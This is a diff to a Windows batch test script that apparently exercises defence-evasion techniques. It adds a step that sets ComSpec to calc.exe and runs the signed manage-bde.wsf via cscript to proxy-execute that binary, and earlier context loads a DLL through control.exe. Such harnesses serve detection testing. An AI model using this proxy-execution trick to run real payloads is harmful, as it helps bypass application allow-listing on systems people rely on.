@@ -422,6 +422,15 @@ start "" cmd /c control.exe AllTheThings.dll
 echo Execution Finished at %time% %date%
 echo Command Excuted: control.exe AllTheThings.dll
 
+echo %time% %date% [+] Testing manage-bde.wsf exec
+set comspec=C:\windows\system32\calc.exe
+start "" cmd /c cscript C:\windows\system32\manage-bde.wsf 
+echo Execution Finished at %time% %date%
+echo Command Excuted: set comspec=C:\windows\system32\calc.exe
+echo Command Excuted: cscript C:\windows\system32\manage-bde.wsf 
+REM Reset ComSpec
+set comspec=C:\WINDOWS\system32\cmd.exe
+
 echo [+] Let tasks finish before killing all the files
 
 sleep 90
